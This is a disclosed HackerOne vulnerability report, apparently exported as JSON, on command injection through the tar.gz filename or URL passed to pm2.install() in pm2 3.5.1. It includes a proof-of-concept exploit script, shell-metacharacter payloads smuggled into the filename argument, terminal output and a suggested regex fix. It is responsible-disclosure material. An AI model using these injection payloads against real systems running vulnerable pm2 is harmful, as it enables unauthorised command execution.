{
  "id": 630227,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzAyMjc=",
  "url": "https://hackerone.com/reports/630227",
  "title": "Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-06-26T20:19:49.389Z",
  "submitted_at": "2019-06-26T20:19:49.389Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-24T09:53:13.071Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-09-24T09:53:10.581Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Guys,\n\nIt's been a while :)\n\n\nI would like to report Command Injection in `pm2.import()` function when `tar.gz` archive is installed with a name provided as user controlled input.\nDue to lack of proper validation of `tar.gz` archive filename, this vulnerability allows to inject arbitrary commands and execute them in context of `pm2`.\n\n# Module\n\n**module name:** pm2\n**version:** 3.5.1\n**npm page:** `https://www.npmjs.com/package/pm2`\n\n## Module Description\n\nPM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.\n\n## Module Stats\n\n**~320.000 downloads/week**\n**>1.200.000 downloads/month**\n\n# Vulnerability\n\nPackages can be installed using `pm2 install [PACKAGE NAME|PACKAGE URL] [options]` command, both directly from command line and from script using `pm2` API. Arbitrary commands can be injected with either first or second method.\n\nHere's a command which executes `echo 'HERE'` in Bash:\n\n```\nbl4de:~/playground/Node $ ./pm2 install \"foo.tar.gz;echo 'HERE'\"\n[PM2][Module] Installing TAR module\n[PM2][Module] Installing package foo.tar.gz;echo 'HERE'\ntar: Error opening archive: Failed to open 'foo.tar.gz'\nHERE -C /var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T module/package.json\n[PM2][ERROR] ENOENT: no such file or directory, open '/var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T/module/package.json'\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show <id|name>` to get more details about an app\nbl4de:~/playground/Node $\n\n```\n\nAlso, `pm2` exposes API which can be used from external scripts and this is IMHO much more dangerous attack vector than directly from command line (but still can be exploited via Bash scripts run eg. by `cron` or any other automated fashion).\n\nHere's a simple JS exploit script (based on example provided on `https://pm2.io/doc/en/runtime/reference/pm2-programmatic/` page), which executes malicious commands defined as `payload` (this represents user provided input):\n\n\n```javascript\n// pm2_exploit.js\n\n'use strict'\nconst pm2 = require('pm2')\n\n// payload - user controllable input\nconst payload = \"foo.tar.gz;touch here;echo whoami>here;chmod +x here;./here>whoamreallyare\"\n\npm2.connect(function(err) {\n    if (err) {\n        console.error(err)\n        process.exit(2)\n    }\n\n    pm2.start({\n\n    }, (err, apps) => {\n        pm2.install(payload, {}) // injection\n        pm2.disconnect()\n        if (err) {\n            throw err\n        }\n    })\n})\n```\n\nAnd here's the result of its execution - the file `whoamreallyare` is created and result of `whoami` command execution is put into:\n\n```\nbl4de:~/playground/Node $ ll\ntotal 224\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -> ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js\nbl4de:~/playground/Node $ node pm2_exploit.js\n\n/Users/bl4de/playground/Node/pm2_exploit.js:20\n            throw err\n            ^\nError: No script path - aborting\ntar: Error opening archive: Failed to open 'foo.tar.gz'\nbl4de:~/playground/Node $ ll\ntotal 240\n-rwxr-xr-x    1 bl4de  staff       7 Jun 26 20:23 here\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -> ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js\n-rw-r--r--    1 bl4de  staff       6 Jun 26 20:23 whoamreallyare\nbl4de:~/playground/Node $ cat whoamreallyare\nbl4de\nbl4de:~/playground/Node $\n\n```\n\n## Vulnerability Description\n\nThe execution chain starts in `lib/API/Modules/Modularizer.js` file, in line 22, which is responsible for execution of `pm2 install` command (I've marked my comments with `////` at the beginning):\n\n```javascript\n/**\n * PM2 Module System.\n */\nModularizer.install = function (CLI, module_name, opts, cb) {\n  if (typeof(opts) == 'function') {\n    cb = opts;\n    opts = {};\n  }\n\n  if (LOCAL.INTERNAL_MODULES.hasOwnProperty(module_name)) {\n    Common.logMod(`Adding dependency ${module_name} to PM2 Runtime`);\n    var currentModule = LOCAL.INTERNAL_MODULES[module_name];\n    if (currentModule && currentModule.hasOwnProperty('dependencies')) {\n      LOCAL.installMultipleModules(currentModule.dependencies, cb);\n    } else {\n      LOCAL.install(currentModule, cb);\n    }\n  }\n  else if (module_name == '.') {\n    Common.logMod(`Installing local NPM module`);\n    return NPM.localStart(CLI, opts, cb)\n  }\n  else if (opts.tarball || module_name.indexOf('.tar.gz') > -1) {   //// vulnerable code\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)  //// not sanitized module_name is used as an argument here \n  }\n  else {\n    Common.logMod(`Installing NPM ${module_name} module`);\n    NPM.install(CLI, module_name, opts, cb)\n  }\n};\n```\n\n\nHere's `TAR.install()` source code (`lib/API/Modules/TAR.js`, line 21). `module_name` variable from previous call is read as `module_filepath` argument:\n\n```javascript\n/**\n * Module management to manage tarball packages\n *\n * pm2 install http.tar.gz\n * pm2 uninstall http\n *\n * - the first and only folder in the tarball must be called module (tar zcvf http module/)\n * - a package.json must be present with attribute \"name\", \"version\" and \"pm2\" to declare apps to run\n */\n\nfunction install(PM2, module_filepath, opts, cb) {\n  // Remote file retrieval\n  if (module_filepath.includes('http') === true) {\n    var target_file = module_filepath.split('/').pop()\n    var target_filepath = path.join(os.tmpdir(), target_file)\n\n    opts.install_url = module_filepath\n\n    return retrieveRemote(module_filepath, target_filepath, (err) => {\n      if (err) {\n        Common.errMod(err)\n        process.exit(1)\n      }\n      installLocal(PM2, target_filepath, opts, cb)\n    })\n  }\n\n  // Local install\n  installLocal(PM2, module_filepath, opts, cb)   //// call to vulnerable function with unsanitized module_filepath\n}\n```\n\n\nLast step in execution chain is `installLocal()` function call in the same `TAR.js` file (`lib/API/Modules/TAR.js`, line 71):\n\n\n\n```javascript\nfunction installLocal(PM2, module_filepath, opts, cb) {\n  Common.logMod(`Installing package ${module_filepath}`)\n\n  // Get module name by unpacking the module/package.json only and read the name attribute\n  getModuleName(module_filepath, function(err, module_name) {\n    if (err) return cb(err)\n\n    Common.logMod(`Module name is ${module_name}`)\n\n    Common.logMod(`Depackaging module...`)\n\n    var install_path = path.join(cst.DEFAULT_MODULE_PATH, module_name);\n\n    if (fs.existsSync(install_path)) {\n      deleteModulePath(module_name)\n    }\n\n    require('mkdirp').sync(install_path)\n\n    //// here unsanitized module_filepath reaches execution sink:\n    var install_instance = spawn('tar', ['zxf', module_filepath, '-C', install_path, '--strip-components 1'], {\n      stdio : 'inherit',\n      env: process.env,\n\t\t  shell : true\n    })\n\n    install_instance.on('close', function(code) {\n      Common.logMod(`Module depackaged in ${install_path}`)\n      if (code == 0)\n        return runInstall(PM2, install_path, module_name, opts, cb)\n      return PM2.exitCli(1)\n    });\n\n    install_instance.on('error', function (err) {\n      console.error(err.stack || err);\n    });\n  })\n}\n\n```\n\nIn the line marked with my comment `module_filepath` finally reaches `tar` OS command call, which executes payload injected as a part of `tar` archive filename.\n\n\n## Steps To Reproduce:\n\n- install pm2 (`npm i pm2`) - I've installed it locally and made symlink to executable `./node_modules/pm2/bin/pm2` in the same folder with `ln -s ./node_modules/pm2/bin/pm2 pm2` command\n- run `pm2 start` to run and verify if `pm2` is installed correctly. You should see output similar to following:\n\n```\nbl4de:~/playground/Node $ ./pm2 start\n[PM2][ERROR] File ecosystem.config.js not found\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show <id|name>` to get more details about an app\nbl4de:~/playground/Node $\n```\n\n- save `pm2_exploit.js` provided in section above in the same folder and run it with `node pm2_exploit.js` command\n- verify that file `whoamreallyare` was created and your username is saved there\n\n\n{F517386}\n\n\n\n## Patch\n\nThe vulnerability exists, because `tar` archive filename provided as an argument of `pm2 install` command is not validated in the correct way (here's part of `lib/API/Modules/Modularizer.js` file, `Modularizer.install` function source code):\n\n```\nelse if (opts.tarball || module_name.indexOf('.tar.gz') > -1) {\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)\n  }\n```\n\n`module_name.indexOf('.tar.gz') > -1` will return `true` always, even if it's not present at the end of the filename. Also, there is no sanitization against Bash special characters like `;` or `|` which allows to inject arbitrary commands after `tar.gz` file extension.\n\nMy suggestion is to use validation similar to following (RegExp checks if filename contains only allowed characters and ends with `tar.gz`):\n\n```javascript\nelse if (opts.tarball || /^[a-z_\\.-]+tar\\.gz$/ig.test(module_name)) {\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)\n  }\n\n```\n\nAfter this change, injection is no longer possible:\n\n```javascript\n'use strict';\n\nconst module_names = [\n    'foo.tar.gz',\n    'some-module_name.with_special_characters_but_still-valid.tar.gz',\n    'foo.tar.gz;echo \"HERE\"',    // sample injection at the end of the filename, after ;\n    'tar.gz;whoami|ls;foo.tar.gz'   // sample injection in the middle of filename\n    ];\n\n\nmodule_names.forEach( module_name => console.log(/^[a-z_\\.-]+tar\\.gz$/ig.test(module_name) === true ))\n\n/*\ntrue\ntrue\nfalse\nfalse\n*/\n```\n\n\n## Supporting Material/References:\n\nVulnerability was tested with following configuration:\n\n- macOS 10.14.5\n- Node 10.13.0\n- npm 6.9.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nCheers,\n\nbl4de\n\n## Impact\n\nAn attacker is able to execute arbitrary commands if the name of `tar` archive comes as user provided input (eg. from external script using `pm2` API) and is used 'as-is' in `pm2.install()` call",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 517386,
      "file_name": "pm2_exploit.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/386/e4d8d52f78edca76f9a0df62ac18b2fa0f43e27a/pm2_exploit.png?response-content-disposition=attachment%3B%20filename%3D%22pm2_exploit.png%22%3B%20filename%2A%3DUTF-8%27%27pm2_exploit.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073752Z&X-Amz-Expires=2357&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=359f74e8aa4dde60397a039acc70d7cccd396c968ab5157683f6c5ae56d9d50a",
      "file_size": 4882621,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2019-10-24T09:53:10.706Z",
  "allow_singular_disclosure_after": -123543881.8081322,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "mashoud1122",
    "m4xx",
    "lumbridge",
    "chajer"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.4,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "high",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 5209979,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bl4de,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@sodacan\n",
      "automated_response": false,
      "created_at": "2019-06-27T21:10:21.552Z",
      "updated_at": "2019-06-27T21:10:21.552Z",
      "actor": {
        "username": "h1_analyst_ava",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_ava",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/l6jvtw54r3s4hzqzp58kpmfycpjm/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5238932,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi Guys,\n\nJust a small update - while digging around, I found that injection is also possible when `pm2.install()` is called with an argument as an url to remote `tar.gz` archive file. The execution chain changes slightly and ends up in `retrieveRemote()` function in `lib/API/Modules/TAR.js` file (line 52):\n\n```javascript\n\nfunction retrieveRemote(url, dest, cb) {\n  Common.logMod(`Retrieving remote package ${url}...`)\n\n  var wget = spawn('wget', [url, '-O', dest, '-q'], {\n    stdio : 'inherit',\n    env: process.env,\n\t\tshell : true\n  })\n\n  wget.on('error', (err) => {\n    console.error(err.stack || err)\n  })\n\n  wget.on('close', (code) => {\n    if (code !== 0)\n      return cb(new Error('Could not download'))\n    return cb(null)\n  })\n}\n```\n\nWith modified payload, like the one below, it is possible to call `retrieveRemote()` and inject OS command(s) as a part of `url` passed as an argument:\n\n```javascript\n// pm2_exploit.js\n'use strict'\nconst pm2 = require('pm2')\n\n// payload - user controllable input\nconst payload = 'http://localhost:8000/some.tar.gz;whoami;uname -a;'\n\npm2.connect(function(err) {\n    if (err) {\n        console.error(err)\n        process.exit(2)\n    }\n\n    pm2.start({\n\n    }, (err, apps) => {\n        pm2.install(payload, {}) // injection\n        pm2.disconnect()\n        if (err) {\n            throw err\n        }\n    })\n})\n```\n\nNow, run exploit:\n`$ node pm2_exploit.js`\nand observe results in terminal window.\n\nAs `url` is not sanitized at all, injected command(s) are executed by this instruction:\n\n```javascript\nvar wget = spawn('wget', [url, '-O', dest, '-q'], {\n    stdio : 'inherit',\n    env: process.env,\n        shell : true\n  })\n```\n\n\nCheers,\n\nbl4de",
      "automated_response": false,
      "created_at": "2019-07-02T13:33:39.640Z",
      "updated_at": "2019-07-02T13:33:39.640Z",
      "actor": {
        "username": "bl4de",
        "cleared": false,
        "verified": false,
        "url": "/bl4de",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5299021,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2019-07-11T09:05:27.419Z",
      "updated_at": "2019-07-11T09:05:27.419Z",
      "additional_data": {
        "old_severity": "Medium",
        "new_severity": "Medium (6.4)",
        "old_severity_id": 444953,
        "new_severity_id": 456050
      },
      "actor": {
        "username": "beagle",
        "cleared": false,
        "verified": false,
        "url": "/beagle",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5299040,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ",
      "automated_response": false,
      "created_at": "2019-07-11T09:12:22.848Z",
      "updated_at": "2019-07-11T09:12:22.848Z",
      "actor": {
        "username": "beagle",
        "cleared": false,
        "verified": false,
        "url": "/beagle",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5299287,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @beagle ,\n\nThank you for the update!\n\nCheers,\n\nbl4de",
      "automated_response": false,
      "created_at": "2019-07-11T10:10:32.807Z",
      "updated_at": "2019-07-11T10:10:32.807Z",
      "actor": {
        "username": "bl4de",
        "cleared": false,
        "verified": false,
        "url": "/bl4de",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5876091,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2019-09-24T09:53:03.793Z",
      "updated_at": "2019-09-24T09:53:03.793Z",
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "bl4de",
        "url": "/bl4de"
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5876092,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2019-09-24T09:53:10.610Z",
      "updated_at": "2019-09-24T09:53:10.610Z",
      "first_to_agree": true,
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 6124046,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2019-10-24T09:53:13.876Z",
      "updated_at": "2019-10-24T09:53:13.876Z",
      "actor": {
        "url": "/nodejs-ecosystem",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Node.js third-party modules"
        }
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}